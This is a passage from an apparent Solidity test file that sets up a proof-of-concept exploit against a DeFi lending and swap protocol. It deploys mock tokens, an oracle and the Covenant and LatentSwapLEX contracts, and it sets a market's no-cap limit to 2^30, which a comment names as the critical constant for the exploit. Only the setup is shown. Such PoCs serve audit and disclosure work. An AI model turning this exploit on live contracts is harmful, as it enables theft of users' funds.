simplicity\n    int64 constant LN_RATE_BIAS = 5012540000000000; // WAD\n\n    uint160 private P_LIM_H;\n    uint160 private P_LIM_MAX;\n\n    // The critical constants for this exploit\n    uint256 constant Q96 = FixedPoint.Q96; // 2^96 = 79,228,162,514,264,337,593,543,950,336\n    uint8 constant NO_CAP_LIMIT = 30; // Will set this to 30 for the test\n    uint256 constant THRESHOLD = 1 << NO_CAP_LIMIT; // 2^30 = 1,073,741,824\n\n    function setUp() public {\n        // Calculate price limits\n        P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n        P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n        // Deploy mock oracle\n        oracle = new MockOracle(deployer);\n\n        // Deploy mock ERC20 tokens (6 decimals like USDC)\n        baseToken = new MockERC20(deployer, \"USDC Mock\", \"USDC\", 6);\n        quoteToken = new MockERC20(deployer, \"Quote Token\", \"QUOTE\", 18);\n\n        // Deploy Covenant\n        covenant = new Covenant(deployer);\n\n        // Deploy LatentSwapLEX\n        lex = new LatentSwapLEX(\n            deployer,\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            P_LIM_H,\n            P_LIM_MAX,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n\n        // Authorize LEX and oracle\n        covenant.setEnabledLEX(address(lex), true);\n        covenant.setEnabledCurator(address(oracle), true);\n\n        // Create market\n        marketParams = MarketParams({\n            baseToken: address(baseToken),\n            quoteToken: address(quoteToken),\n            curator: address(oracle),\n            lex: address(lex)\n        });\n        marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // Set noCapLimit to 30 for this market\n        // This means the threshold is 2^30 = 1,073,741,824 tokens\n        lex.setMarketNoCapLimit(marketId, NO_CAP_LIMIT);\n\n        // Verify the noCapLimit was set correct